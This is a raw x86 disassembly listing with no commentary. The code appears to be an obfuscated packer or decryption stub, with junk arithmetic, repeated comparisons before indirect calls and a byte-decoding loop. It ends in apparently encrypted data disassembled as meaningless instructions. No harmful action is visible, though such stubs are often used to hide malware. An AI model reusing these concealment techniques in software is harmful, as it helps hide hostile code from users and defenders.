  42114d:	cmp    al,BYTE PTR ds:0x428746
  421153:	jne    0x420849
  421159:	adc    DWORD PTR ds:0x428ea7,0x4891
  421163:	push   0x42874f
  421168:	xor    DWORD PTR ds:0x428ecb,0x428ec3
  421172:	push   0x42875b
  421177:	call   edi
  421179:	xor    DWORD PTR ds:0x428ecb,0x428e67
  421183:	test   eax,eax
  421185:	mov    DWORD PTR ds:0x428e77,0x34d8
  42118f:	je     0x420849
  421195:	mov    DWORD PTR ds:0x428e63,0x47d8
  42119f:	mov    al,ds:0x428768
  4211a4:	mov    DWORD PTR ds:0x428ebb,0x60f8
  4211ae:	cmp    al,BYTE PTR ds:0x428779
  4211b4:	mov    DWORD PTR ds:0x428e63,0x352f
  4211be:	jne    0x420849
  4211c4:	mov    al,ds:0x428785
  4211c9:	mov    DWORD PTR ds:0x428e37,0x65de
  4211d3:	cmp    al,BYTE PTR ds:0x428796
  4211d9:	mov    DWORD PTR ds:0x428e3f,0x2ba7
  4211e3:	jne    0x420849
  4211e9:	push   0x42879f
  4211ee:	sbb    DWORD PTR ds:0x428e6b,0x25d3
  4211f8:	push   0x4287ab
  4211fd:	call   edi
  4211ff:	adc    DWORD PTR ds:0x428ebf,0x428ea3
  421209:	test   eax,eax
  42120b:	mov    DWORD PTR ds:0x428e6f,0x1c88
  421215:	je     0x420849
  42121b:	not    DWORD PTR ds:0x428e63
  421221:	mov    al,ds:0x4287b8
  421226:	cmp    al,BYTE PTR ds:0x4287c9
  42122c:	jne    0x420849
  421232:	mov    al,ds:0x4287d5
  421237:	mov    DWORD PTR ds:0x428e7b,0x5e30
  421241:	cmp    al,BYTE PTR ds:0x4287e6
  421247:	mov    DWORD PTR ds:0x428e9b,0x700f
  421251:	jne    0x420849
  421257:	or     DWORD PTR ds:0x428e83,0x99a
  421261:	push   0x4287ef
  421266:	adc    DWORD PTR ds:0x428e9f,0x22ee
  421270:	push   0x4287fb
  421275:	adc    DWORD PTR ds:0x428ecb,0x428ec3
  42127f:	call   edi
  421281:	sub    DWORD PTR ds:0x428e43,0x72f1
  42128b:	test   eax,eax
  42128d:	je     0x420849
  421293:	mov    DWORD PTR ds:0x428e57,0x70e
  42129d:	mov    al,ds:0x428808
  4212a2:	cmp    al,BYTE PTR ds:0x428819
  4212a8:	jne    0x420849
  4212ae:	mov    al,ds:0x428825
  4212b3:	mov    DWORD PTR ds:0x428ea3,0x4a62
  4212bd:	cmp    al,BYTE PTR ds:0x428836
  4212c3:	mov    DWORD PTR ds:0x428ea7,0x4507
  4212cd:	jne    0x420849
  4212d3:	sbb    DWORD PTR ds:0x428e23,0x428e6f
  4212dd:	push   0x42883f
  4212e2:	xor    DWORD PTR ds:0x428e2b,0x428e87
  4212ec:	push   0x42884b
  4212f1:	or     DWORD PTR ds:0x428e8f,0x428e6b
  4212fb:	call   edi
  4212fd:	test   eax,eax
  4212ff:	mov    DWORD PTR ds:0x428ec7,0x3c0e
  421309:	je     0x420849
  42130f:	mov    DWORD PTR ds:0x428e2f,0x1c83
  421319:	mov    al,ds:0x428858
  42131e:	cmp    al,BYTE PTR ds:0x428869
  421324:	jne    0x420849
  42132a:	mov    al,ds:0x428875
  42132f:	mov    DWORD PTR ds:0x428eab,0x7836
  421339:	cmp    al,BYTE PTR ds:0x428886
  42133f:	mov    DWORD PTR ds:0x428e33,0x5d16
  421349:	jne    0x420849
  42134f:	push   0x42888f
  421354:	or     DWORD PTR ds:0x428e6f,0x428e43
  42135e:	push   0x42889b
  421363:	adc    DWORD PTR ds:0x428e6f,0x64ad
  42136d:	call   edi
  42136f:	and    DWORD PTR ds:0x428e93,0x428eb3
  421379:	test   eax,eax
  42137b:	je     0x420849
  421381:	mov    al,ds:0x4288a8
  421386:	cmp    al,BYTE PTR ds:0x4288b9
  42138c:	mov    DWORD PTR ds:0x428e2b,0x5e8c
  421396:	jne    0x420849
  42139c:	mov    DWORD PTR ds:0x428ea3,0x4898
  4213a6:	mov    al,ds:0x4288c5
  4213ab:	cmp    al,BYTE PTR ds:0x4288d6
  4213b1:	jne    0x420849
  4213b7:	push   0x4288df
  4213bc:	push   0x4288eb
  4213c1:	call   edi
  4213c3:	test   eax,eax
  4213c5:	mov    DWORD PTR ds:0x428ebb,0xe84
  4213cf:	je     0x420849
  4213d5:	mov    al,ds:0x4288f8
  4213da:	cmp    al,BYTE PTR ds:0x428909
  4213e0:	mov    DWORD PTR ds:0x428e3b,0x418e
  4213ea:	jne    0x420849
  4213f0:	mov    DWORD PTR ds:0x428e5b,0x25d1
  4213fa:	mov    al,ds:0x428915
  4213ff:	cmp    al,BYTE PTR ds:0x428926
  421405:	mov    DWORD PTR ds:0x428e6b,0x4b5f
  42140f:	jne    0x420849
  421415:	push   0x42892f
  42141a:	adc    DWORD PTR ds:0x428ec7,0x4db7
  421424:	push   0x42893b
  421429:	sbb    DWORD PTR ds:0x428e6b,0x428ebf
  421433:	call   edi
  421435:	sub    DWORD PTR ds:0x428e33,0x428e97
  42143f:	test   eax,eax
  421441:	mov    DWORD PTR ds:0x428ec7,0x19ef
  42144b:	je     0x420849
  421451:	mov    al,ds:0x428948
  421456:	cmp    al,BYTE PTR ds:0x428959
  42145c:	jne    0x420849
  421462:	mov    al,ds:0x428965
  421467:	cmp    al,BYTE PTR ds:0x428976
  42146d:	jne    0x420849
  421473:	push   0x42897f
  421478:	push   0x42898b
  42147d:	call   edi
  42147f:	test   eax,eax
  421481:	je     0x420849
  421487:	mov    al,ds:0x428998
  42148c:	cmp    al,BYTE PTR ds:0x4289a9
  421492:	jne    0x420849
  421498:	mov    al,ds:0x4289b5
  42149d:	cmp    al,BYTE PTR ds:0x4289c6
  4214a3:	jne    0x420849
  4214a9:	push   0x4289cf
  4214ae:	push   0x4289db
  4214b3:	call   edi
  4214b5:	test   eax,eax
  4214b7:	je     0x420849
  4214bd:	mov    al,ds:0x4289e8
  4214c2:	cmp    al,BYTE PTR ds:0x4289f9
  4214c8:	jne    0x420849
  4214ce:	mov    al,ds:0x428a05
  4214d3:	cmp    al,BYTE PTR ds:0x428a16
  4214d9:	jne    0x420849
  4214df:	push   0x428a1f
  4214e4:	push   0x428a2b
  4214e9:	call   edi
  4214eb:	test   eax,eax
  4214ed:	je     0x420849
  4214f3:	mov    al,ds:0x428a38
  4214f8:	cmp    al,BYTE PTR ds:0x428a49
  4214fe:	jne    0x420849
  421504:	mov    al,ds:0x428a55
  421509:	cmp    al,BYTE PTR ds:0x428a66
  42150f:	jne    0x420849
  421515:	push   0x428a6f
  42151a:	push   0x428a7b
  42151f:	call   edi
  421521:	test   eax,eax
  421523:	je     0x420849
  421529:	mov    al,ds:0x428a88
  42152e:	cmp    al,BYTE PTR ds:0x428a99
  421534:	jne    0x420849
  42153a:	mov    al,ds:0x428aa5
  42153f:	cmp    al,BYTE PTR ds:0x428ab6
  421545:	jne    0x420849
  42154b:	push   0x428abf
  421550:	push   0x428acb
  421555:	call   edi
  421557:	test   eax,eax
  421559:	je     0x420849
  42155f:	mov    al,ds:0x428ad8
  421564:	cmp    al,BYTE PTR ds:0x428ae9
  42156a:	jne    0x420849
  421570:	mov    al,ds:0x428af5
  421575:	cmp    al,BYTE PTR ds:0x428b06
  42157b:	jne    0x420849
  421581:	push   0x428b0f
  421586:	push   0x428b1b
  42158b:	call   edi
  42158d:	test   eax,eax
  42158f:	je     0x420849
  421595:	mov    al,ds:0x428b28
  42159a:	cmp    al,BYTE PTR ds:0x428b39
  4215a0:	jne    0x420849
  4215a6:	mov    al,ds:0x428b45
  4215ab:	cmp    al,BYTE PTR ds:0x428b56
  4215b1:	jne    0x420849
  4215b7:	push   0x428b5f
  4215bc:	push   0x428b6b
  4215c1:	call   edi
  4215c3:	test   eax,eax
  4215c5:	je     0x420849
  4215cb:	mov    al,ds:0x428b78
  4215d0:	cmp    al,BYTE PTR ds:0x428b89
  4215d6:	jne    0x420849
  4215dc:	mov    al,ds:0x428b95
  4215e1:	cmp    al,BYTE PTR ds:0x428ba6
  4215e7:	jne    0x420849
  4215ed:	push   0x428baf
  4215f2:	push   0x428bbb
  4215f7:	call   edi
  4215f9:	test   eax,eax
  4215fb:	je     0x420849
  421601:	mov    al,ds:0x428bc8
  421606:	cmp    al,BYTE PTR ds:0x428bd9
  42160c:	jne    0x420849
  421612:	mov    al,ds:0x428be5
  421617:	cmp    al,BYTE PTR ds:0x428bf6
  42161d:	jne    0x420849
  421623:	push   0x428bff
  421628:	push   0x428c0b
  42162d:	call   edi
  42162f:	test   eax,eax
  421631:	je     0x420849
  421637:	mov    eax,DWORD PTR [esp+0x3c]
  42163b:	cmp    eax,0xf89c85a4
  421640:	je     0x42169f
  421646:	mov    eax,DWORD PTR [esp+0x20]
  42164a:	mov    ecx,DWORD PTR [esp+0x38]
  42164e:	xor    eax,esi
  421650:	add    eax,ebx
  421652:	cmp    eax,ecx
  421654:	je     0x42169f
  42165a:	mov    eax,ds:0x428373
  42165f:	mov    eax,DWORD PTR [eax+0x194]
  421665:	mov    ecx,DWORD PTR [eax]
  421667:	mov    eax,DWORD PTR [ecx+0x3c]
  42166a:	push   DWORD PTR ds:0x428453
  421670:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  421674:	push   DWORD PTR ds:0x4281f7
  42167a:	add    eax,ecx
  42167c:	mov    ecx,DWORD PTR ds:0x428373
  421682:	mov    ecx,DWORD PTR [ecx+0x194]
  421688:	push   DWORD PTR [ecx]
  42168a:	call   eax
  42168c:	mov    ecx,DWORD PTR ds:0x428373
  421692:	mov    ecx,DWORD PTR [ecx+0x1cc]
  421698:	mov    DWORD PTR [ecx],eax
  42169a:	jmp    0x421870
  42169f:	mov    eax,DWORD PTR [esp+0x20]
  4216a3:	mov    ecx,DWORD PTR [esp+0x40]
  4216a7:	xor    eax,esi
  4216a9:	add    eax,ebx
  4216ab:	cmp    eax,ecx
  4216ad:	jne    0x421718
  4216b3:	mov    eax,DWORD PTR [esp+0x20]
  4216b7:	mov    ecx,DWORD PTR ds:0x428373
  4216bd:	mov    ecx,DWORD PTR [ecx+0x198]
  4216c3:	xor    eax,esi
  4216c5:	add    eax,ebx
  4216c7:	cmp    eax,DWORD PTR [ecx]
  4216c9:	jne    0x4216f1
  4216cf:	mov    eax,DWORD PTR [esp+0x20]
  4216d3:	push   0xffffffff
  4216d5:	push   0x70941f91
  4216da:	xor    eax,esi
  4216dc:	add    eax,ebx
  4216de:	push   eax
  4216df:	push   0xf89c85a1
  4216e4:	push   DWORD PTR [esp+0x1c]
  4216e8:	push   DWORD PTR [esp+0x34]
  4216ec:	call   0x41b999
  4216f1:	push   DWORD PTR [esp+0xc]
  4216f5:	push   DWORD PTR [esp+0x24]
  4216f9:	call   0x401000
  4216fe:	mov    eax,DWORD PTR [esp+0x20]
  421702:	xor    eax,esi
  421704:	add    eax,ebx
  421706:	mov    ds:0x4283ff,eax
  42170b:	mov    eax,DWORD PTR [esp+0x20]
  42170f:	xor    eax,esi
  421711:	add    eax,ebx
  421713:	mov    ds:0x4283f7,eax
  421718:	mov    eax,DWORD PTR [esp+0x2c]
  42171c:	test   eax,eax
  42171e:	je     0x421870
  421724:	mov    DWORD PTR [esp+0x4c],0xf152c3c
  42172c:	mov    DWORD PTR [esp+0x54],0x712ed2f
  421734:	mov    DWORD PTR [esp+0x48],0x373fc0d
  42173c:	mov    DWORD PTR [esp+0x50],0x72670add
  421744:	call   0x41932f
  421749:	mov    eax,DWORD PTR [esp+0x34]
  42174d:	mov    eax,DWORD PTR [esp+0xc]
  421751:	mov    DWORD PTR [esp+0x30],eax
  421755:	mov    eax,DWORD PTR [esp+0x20]
  421759:	mov    DWORD PTR [esp+0xc],eax
  42175d:	mov    eax,eax
  42175f:	mov    eax,ds:0x428373
  421764:	mov    ecx,DWORD PTR [eax+0x1c0]
  42176a:	mov    edx,DWORD PTR [ecx]
  42176c:	and    DWORD PTR [esp+0x14],0x0
  421771:	mov    edi,0xfabdbed2
  421776:	add    edx,edi
  421778:	adc    DWORD PTR [esp+0x14],0xffffffff
  42177d:	mov    ecx,0x8a29a143
  421782:	xor    edx,ecx
  421784:	mov    DWORD PTR [esp+0x18],edx
  421788:	mov    edx,DWORD PTR [esp+0x14]
  42178c:	xor    edx,0x0
  42178f:	cmp    DWORD PTR [esp+0x18],0x70941f90
  421797:	mov    DWORD PTR [esp+0x1c],edx
  42179b:	jne    0x4217aa
  4217a1:	cmp    edx,0xffffffff
  4217a4:	je     0x421813
  4217aa:	mov    eax,DWORD PTR [eax+0x1c8]
  4217b0:	mov    eax,DWORD PTR [eax]
  4217b2:	cdq    
  4217b3:	add    eax,edi
  4217b5:	adc    edx,0xffffffff
  4217b8:	and    DWORD PTR [esp+0x14],0x0
  4217bd:	xor    edx,0x0
  4217c0:	mov    DWORD PTR [esp+0x24],edx
  4217c4:	mov    edx,DWORD PTR [esp+0xc]
  4217c8:	mov    DWORD PTR [esp+0x10],edx
  4217cc:	xor    eax,ecx
  4217ce:	add    DWORD PTR [esp+0x10],edi
  4217d2:	mov    edx,DWORD PTR [esp+0x10]
  4217d6:	adc    DWORD PTR [esp+0x14],0xffffffff
  4217db:	xor    edx,ecx
  4217dd:	mov    DWORD PTR [esp+0x18],edx
  4217e1:	mov    edx,DWORD PTR [esp+0x14]
  4217e5:	xor    edx,0x0
  4217e8:	mov    DWORD PTR [esp+0x1c],edx
  4217ec:	cmp    DWORD PTR [esp+0x18],eax
  4217f0:	jne    0x421802
  4217f6:	mov    eax,DWORD PTR [esp+0x24]
  4217fa:	cmp    edx,eax
  4217fc:	je     0x421813
  421802:	mov    eax,DWORD PTR [esp+0xc]
  421806:	add    eax,DWORD PTR [esp+0x30]
  42180a:	mov    DWORD PTR [esp+0xc],eax
  42180e:	jmp    0x421870
  421813:	mov    eax,ds:0x4283f7
  421818:	mov    edx,DWORD PTR ds:0x4283ff
  42181e:	xor    eax,edx
  421820:	mov    ds:0x4283f7,eax
  421825:	mov    edx,DWORD PTR ds:0x4283f7
  42182b:	mov    eax,DWORD PTR [esp+0x2c]
  42182f:	add    DWORD PTR [eax],edx
  421831:	mov    edx,DWORD PTR [esp+0xc]
  421835:	mov    eax,ds:0x4283f7
  42183a:	xor    edx,esi
  42183c:	add    edx,ebx
  42183e:	xor    ebx,ebx
  421840:	add    edx,edi
  421842:	adc    ebx,0xffffffff
  421845:	xor    esi,esi
  421847:	xor    edx,ecx
  421849:	xor    ebx,0x0
  42184c:	add    eax,edi
  42184e:	adc    esi,0xffffffff
  421851:	xor    eax,ecx
  421853:	xor    esi,0x0
  421856:	cmp    eax,edx
  421858:	jne    0x421870
  42185e:	cmp    esi,ebx
  421860:	jne    0x421870
  421866:	mov    eax,ds:0x4283f7
  42186b:	mov    ds:0x4283ff,eax
  421870:	mov    eax,ds:0x428373
  421875:	push   0x4
  421877:	add    eax,0x1cc
  42187c:	push   eax
  42187d:	lea    eax,[esp+0x3c]
  421881:	push   eax
  421882:	call   0x421896
  421887:	mov    eax,DWORD PTR [esp+0x34]
  42188b:	mov    eax,DWORD PTR [eax]
  42188d:	pop    edi
  42188e:	pop    esi
  42188f:	pop    ebx
  421890:	mov    esp,ebp
  421892:	pop    ebp
  421893:	ret    0xc
  421896:	push   ebp
  421897:	mov    ebp,esp
  421899:	sub    esp,0x10
  42189c:	mov    eax,0xf89c85a5
  4218a1:	mov    DWORD PTR [ebp-0x4],eax
  4218a4:	mov    DWORD PTR ds:0x428ecb,0x1d
  4218ae:	cmp    DWORD PTR ds:0x428ecb,0x0
  4218b5:	je     0x421906
  4218bb:	cmp    DWORD PTR ds:0x428ecb,0x8
  4218c2:	jg     0x421906
  4218c8:	jmp    0x4218d8
  4218cd:	push   0x428e77
  4218d2:	call   DWORD PTR ds:0x42aa37
  4218d8:	cmp    DWORD PTR ds:0x428ecb,0x9
  4218df:	jne    0x4218f2
  4218e5:	mov    edx,DWORD PTR ds:0x428ecb
  4218eb:	dec    edx
  4218ec:	mov    DWORD PTR ds:0x428ecb,edx
  4218f2:	xor    edx,edx
  4218f4:	add    edx,DWORD PTR ds:0x428ecb
  4218fa:	dec    edx
  4218fb:	mov    DWORD PTR ds:0x428ecb,edx
  421901:	jmp    0x4218ae
  421906:	mov    DWORD PTR [ebp-0x8],0xf89c85a4
  42190d:	xor    ecx,edx
  42190f:	mov    ecx,DWORD PTR [ebp-0x4]
  421912:	sbb    edx,0x5246
  421918:	push   esi
  421919:	or     DWORD PTR ds:0x428e5b,edi
  42191f:	mov    edx,0x75108af
  421924:	adc    DWORD PTR ds:0x428e43,0x2a82
  42192e:	xor    ecx,edx
  421930:	sbb    DWORD PTR ds:0x428e93,edi
  421936:	mov    esi,0x3272f6
  42193b:	push   edi
  42193c:	inc    DWORD PTR ds:0x428e47
  421942:	mov    edi,DWORD PTR [ebp+0x10]
  421945:	adc    DWORD PTR ds:0x428e43,0x428ecf
  42194f:	add    ecx,esi
  421951:	cmp    ecx,edi
  421953:	mov    DWORD PTR ds:0x428ea3,0x27d
  42195d:	je     0x421a9e
  421963:	mov    ecx,DWORD PTR ds:0x428e33
  421969:	or     DWORD PTR ds:0x428e2b,ecx
  42196f:	mov    ecx,DWORD PTR [ebp-0x4]
  421972:	mov    edi,DWORD PTR [ebp+0x10]
  421975:	xor    eax,eax
  421977:	xor    ecx,edx
  421979:	sub    DWORD PTR ds:0x428e2b,0x428e2f
  421983:	add    ecx,esi
  421985:	xor    DWORD PTR ds:0x428e6b,0x2e89
  42198f:	add    edi,0xfabdbed2
  421995:	mov    DWORD PTR ds:0x428e27,0xdb6
  42199f:	adc    eax,0xffffffff
  4219a2:	adc    DWORD PTR ds:0x428e23,0x428e77
  4219ac:	xor    eax,0x0
  4219af:	mov    DWORD PTR [ebp-0xc],eax
  4219b2:	push   ebx
  4219b3:	mov    eax,ds:0x428e37
  4219b8:	add    eax,DWORD PTR ds:0x428ebf
  4219be:	mov    ds:0x428e37,eax
  4219c3:	xor    ebx,ebx
  4219c5:	adc    DWORD PTR ds:0x428e4b,0x1a92
  4219cf:	xor    edi,0x8a29a143
  4219d5:	adc    eax,DWORD PTR ds:0x428e3b
  4219db:	mov    eax,ecx
  4219dd:	xor    DWORD PTR ds:0x428e4b,0x428e93
  4219e7:	add    eax,0xfabdbed2
  4219ec:	mov    DWORD PTR ds:0x428e2b,0x4aa
  4219f6:	adc    ebx,0xffffffff
  4219f9:	xor    eax,0x8a29a143
  4219fe:	and    DWORD PTR ds:0x428e9f,0x428e57
  421a08:	xor    ebx,0x0
  421a0b:	mov    DWORD PTR ds:0x428e3b,0x3b6d
  421a15:	cmp    eax,edi
  421a17:	jne    0x421a30
  421a1d:	cmp    ebx,DWORD PTR [ebp-0xc]
  421a20:	je     0x421a98
  421a26:	jmp    0x421a30
  421a2b:	mov    esi,0x3272f6
  421a30:	mov    eax,DWORD PTR [ebp-0x4]
  421a33:	mov    edi,DWORD PTR [ebp-0x8]
  421a36:	xor    edi,edx
  421a38:	add    edi,esi
  421a3a:	mov    esi,DWORD PTR [ebp+0x8]
  421a3d:	imul   edi,ecx
  421a40:	mov    ebx,DWORD PTR [ebp+0xc]
  421a43:	xor    eax,edx
  421a45:	add    eax,ecx
  421a47:	mov    al,BYTE PTR [ebx+eax*1+0x3272f6]
  421a4e:	mov    BYTE PTR [edi+esi*1],al
  421a51:	mov    eax,DWORD PTR [ebp-0x8]
  421a54:	mov    esi,DWORD PTR [ebp+0x10]
  421a57:	xor    eax,edx
  421a59:	xor    ebx,ebx
  421a5b:	add    esi,0xfabdbed2
  421a61:	adc    ebx,0xffffffff
  421a64:	lea    ecx,[ecx+eax*1+0x3272f6]
  421a6b:	xor    edi,edi
  421a6d:	xor    esi,0x8a29a143
  421a73:	xor    ebx,0x0
  421a76:	mov    eax,ecx
  421a78:	add    eax,0xfabdbed2
  421a7d:	adc    edi,0xffffffff
  421a80:	xor    eax,0x8a29a143
  421a85:	xor    edi,0x0
  421a88:	cmp    eax,esi
  421a8a:	jne    0x421a2b
  421a90:	cmp    edi,ebx
  421a92:	jne    0x421a2b
  421a98:	mov    eax,0xf89c85a4
  421a9d:	pop    ebx
  421a9e:	pop    edi
  421a9f:	pop    esi
  421aa0:	leave  
  421aa1:	ret    0xc
  421aa4:	push   ebp
  421aa5:	mov    ebp,esp
  421aa7:	push   ecx
  421aa8:	dec    eax
  421aa9:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  421ab0:	mov    ecx,DWORD PTR ds:0x428ea7
  421ab6:	sub    DWORD PTR ds:0x428e93,ecx
  421abc:	jmp    0x423e02
  421ac1:	loope  0x421acb
  421ac3:	jg     0x421b24
  421ac5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ac6:	add    al,0xe1
  421ac8:	test   BYTE PTR [ecx-0x7e42adb6],al
  421ace:	shl    BYTE PTR [ebp-0x7d499029],0x83
  421ad5:	pop    edx
  421ad6:	pusha  
  421ad7:	add    DWORD PTR [ebx+0x53f4f52c],0x1
  421ade:	or     dl,dl
  421ae0:	adc    BYTE PTR [eax-0x60c14e99],al
  421ae6:	push   eax
  421ae7:	adc    DWORD PTR [ebp+eiz*1+0xf],0x76
  421aec:	adc    DWORD PTR [ebx+0x3c],esi
  421aef:	lock cmp eax,0x868ecbb0
  421af5:	loopne 0x421a7d
  421af7:	ja     0x421aca
  421af9:	movzx  esi,BYTE PTR ds:[edi+0x1a59e475]
  421b01:	inc    ebx
  421b02:	xchg   edx,eax
  421b03:	(bad)
  421b07:	push   ecx
  421b08:	in     al,0xac
  421b0a:	call   0x1860482e
  421b0f:	out    0x2b,eax
  421b11:	mov    WORD PTR [eax-0x2ed1cb40],?
  421b17:	jne    0x421b35
  421b19:	mov    ch,0xc8
  421b1b:	leavew 
  421b1d:	pop    esi
  421b1e:	sbb    BYTE PTR [ebx],dl
  421b20:	jp     0x421b03
  421b22:	xchg   edx,eax
  421b23:	mov    edi,0xfdfcc64b
  421b28:	(bad)  
  421b29:	addr16 fwait
  421b2b:	push   0xf1a6ca04
  421b30:	xchg   ebp,eax
  421b31:	(bad)  
  421b32:	call   0x594c80c4
  421b37:	sar    DWORD PTR [edx+esi*2+0x745a07b6],0xe2
  421b3f:	aam    0xf3
  421b41:	repnz mov ch,0x9d
  421b44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421b45:	scas   eax,DWORD PTR es:[edi]
  421b46:	test   al,0x29
  421b48:	shr    ah,1
  421b4a:	sub    al,0xa9
  421b4c:	xor    edi,DWORD PTR [ecx]
  421b4e:	test   DWORD PTR [eax+0x1adb7494],ebx
  421b54:	jmp    0xc6356067
  421b59:	push   ebx
  421b5a:	xor    BYTE PTR [edi],ch
  421b5c:	and    BYTE PTR ds:0x3995a2e4,bl
  421b62:	leave  
  421b63:	lds    edi,FWORD PTR [ebx+ecx*8]
  421b66:	dec    ecx
  421b67:	mov    edi,0xfe7d8bc0
  421b6c:	out    0x63,eax
  421b6e:	jg     0x421b7d
  421b70:	adc    al,0x34
  421b72:	pop    DWORD PTR [eax+0xc097f20]
  421b78:	inc    ebp
  421b79:	(bad)  
  421b7a:	shl    DWORD PTR [ecx],cl
  421b7c:	xchg   esi,eax
  421b7d:	shl    BYTE PTR [edx+ebp*1+0x54],cl
  421b81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421b82:	and    esi,DWORD PTR [edi+0xc]
  421b85:	cld    
  421b86:	out    dx,eax
  421b87:	(bad)  
  421b88:	mov    ebp,0xa5653c9
  421b8d:	popa   
  421b8e:	ss leave 
  421b90:	inc    edi
  421b91:	push   0x78590476
  421b96:	mov    esp,0x345fb440
  421b9b:	scas   eax,DWORD PTR es:[edi]
  421b9c:	adc    DWORD PTR [edi+eax*8],edi
  421b9f:	fist   WORD PTR [ebx+ebx*4-0x7e45095c]
  421ba6:	mov    al,0xdf
  421ba8:	adc    eax,DWORD PTR [eax]
  421baa:	dec    esp
  421bab:	out    0x4a,al
  421bad:	test   BYTE PTR [ebp+0x4],cl
  421bb0:	out    dx,al
  421bb1:	(bad)  
  421bb2:	mov    WORD PTR [edx+eiz*1+0x619261da],ds
  421bb9:	loope  0x421c07
  421bbb:	and    dh,BYTE PTR ds:0x80586344
  421bc1:	clc    
  421bc2:	pop    ds
  421bc3:	jl     0x421bdd
  421bc5:	loopne 0x421c1f
  421bc7:	jo     0x421b93
  421bc9:	inc    edi
  421bca:	pop    ss
  421bcb:	inc    ebx
  421bcc:	loope  0x421b78
  421bce:	xchg   ecx,eax
  421bcf:	push   ebx
  421bd0:	jno    0x421c2b
  421bd2:	rdmsr  
  421bd4:	jge    0x421bc4
  421bd6:	pop    ss
  421bd7:	stos   BYTE PTR es:[edi],al
  421bd8:	ret    
  421bd9:	dec    esi
  421bda:	test   eax,esi
  421bdc:	push   cs
  421bdd:	pusha  
  421bde:	jmp    0x74a15cfa
  421be3:	mov    ebx,0xd8622175
  421be8:	dec    ebx
  421be9:	das    
  421bea:	int3   
  421beb:	mov    eax,ds:0x597f1d60
  421bf0:	and    DWORD PTR [edx-0x15],ebx
  421bf3:	mov    cs,ebx
  421bf5:	mov    dh,0x40
  421bf7:	adc    al,0x26
  421bf9:	inc    esi
  421bfa:	mov    ah,0xa0
  421bfc:	push   edx
  421bfd:	repz dec edi
  421bff:	lahf   
  421c00:	cs pop esp
  421c02:	addr16 sub al,0xaf
  421c05:	cmp    eax,ebx
  421c07:	dec    esi
  421c08:	test   edi,esp
  421c0a:	inc    ecx
  421c0b:	stc    
  421c0c:	out    dx,eax
  421c0d:	(bad)  [ebp-0x7b]
  421c10:	ret    0x22
  421c13:	pop    eax
  421c14:	gs pop eax
  421c16:	lods   eax,DWORD PTR ds:[esi]
  421c17:	adc    BYTE PTR [ebp-0x53],dh
  421c1a:	dec    edi
  421c1b:	pop    es
  421c1c:	push   es
  421c1d:	xchg   ebp,eax
  421c1e:	imul   edx,DWORD PTR [edx],0xb042dead
  421c24:	add    eax,0x59366aa4
  421c29:	out    0x69,eax
  421c2b:	es xor eax,0x59217d77
  421c31:	das    
  421c32:	jnp    0x421bf4
  421c34:	in     eax,0x9c
  421c36:	sub    eax,0x433467ff
  421c3b:	idiv   DWORD PTR [ebx+0x10]
  421c3e:	pop    ebx
  421c3f:	push   ss
  421c40:	int    0x82
  421c42:	or     dl,bl
  421c44:	mov    bh,ch
  421c46:	out    0x92,al
  421c48:	pop    es
  421c49:	out    0x2b,eax
  421c4b:	jl     0x421c6d
  421c4d:	sbb    bh,cl
  421c4f:	mov    ecx,DWORD PTR [esi+0x2a]
  421c52:	mov    ebx,0x656ed1d1
  421c57:	mov    al,ds:0x7fc16f2a
  421c5c:	xlat   BYTE PTR ds:[ebx]
  421c5d:	rol    DWORD PTR [edx+ebx*2],0x40
  421c61:	jns    0x421ce2
  421c63:	in     al,dx
  421c64:	inc    edx
  421c65:	rcr    ecx,0x8e
  421c68:	and    al,0xc3
  421c6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c6b:	dec    ecx
  421c6c:	(bad)  
  421c6d:	fcom   QWORD PTR [edx+esi*4+0x3091beca]
  421c74:	cmp    ch,bh
  421c76:	aas    
  421c77:	add    edi,DWORD PTR [esi+0x6efb4e50]
  421c7d:	jl     0x421cbd
  421c7f:	scas   al,BYTE PTR es:[edi]
  421c80:	(bad)  
  421c81:	pop    ss
  421c82:	sar    eax,0xa6
  421c85:	gs stos BYTE PTR es:[edi],al
  421c87:	sbb    DWORD PTR [edi],esi
  421c89:	mov    ds:0x6c1bb9fc,eax
  421c8e:	or     esp,DWORD PTR [ebp+0x6]
  421c91:	(bad)  
  421c92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c93:	jmp    0x7b1b0a7e
  421c98:	or     al,0x67
  421c9a:	lsl    edx,WORD PTR [ebp+0x68]
  421c9e:	mov    ds:0x3bfa8a73,eax
  421ca3:	xchg   ebp,eax
  421ca4:	shr    DWORD PTR [ecx],1
  421ca6:	es jp  0x421c5d
  421ca9:	sbb    BYTE PTR ds:0xc9374252,bl
  421caf:	mov    dh,0x8a
  421cb1:	jbe    0x421cb1
  421cb3:	adc    esp,DWORD PTR [ecx-0x5a]
  421cb6:	icebp  
  421cb7:	cmc    
  421cb8:	aas    
  421cb9:	mov    ecx,DWORD PTR [ebx+0x2]
  421cbc:	lds    ecx,FWORD PTR [edx]
  421cbe:	fcmovnbe st,st(5)
  421cc0:	in     eax,dx
  421cc1:	lods   eax,DWORD PTR ds:[esi]
  421cc2:	das    
  421cc3:	xchg   ebp,eax
  421cc4:	inc    ebx
  421cc5:	mov    ebp,0x9a6ea368
  421cca:	mov    BYTE PTR [esi-0x7f],dl
  421ccd:	inc    ecx
  421cce:	test   al,0x77
  421cd0:	ror    BYTE PTR ds:0xa904b78f,cl
  421cd6:	test   eax,0xde32f9ff
  421cdb:	xchg   BYTE PTR [ecx*2-0x2e23aa69],dh
  421ce2:	aas    
  421ce3:	clc    
  421ce4:	call   0x2f243ae0
  421ce9:	xchg   esi,eax
  421cea:	rcl    DWORD PTR [esi-0x7a],0xc1
  421cee:	push   esi
  421cef:	sbb    ebx,0xffffffe3
  421cf2:	neg    BYTE PTR [edi]
  421cf4:	jl     0x421d52
  421cf6:	add    ebp,DWORD PTR [ebx]
  421cf8:	jo     0x421c91
  421cfa:	addr16 repz xor cl,0xf
  421cff:	fwait
  421d00:	in     eax,dx
  421d01:	psubq  mm1,QWORD PTR [eax+edi*8+0x48]
  421d06:	les    esp,FWORD PTR ds:0xf02fcc8
  421d0c:	daa    
  421d0d:	xchg   esi,eax
  421d0e:	in     eax,0x18
  421d10:	ja     0x421d03
  421d12:	adc    DWORD PTR [ecx+0x71],eax
  421d15:	lds    ecx,FWORD PTR [edx]
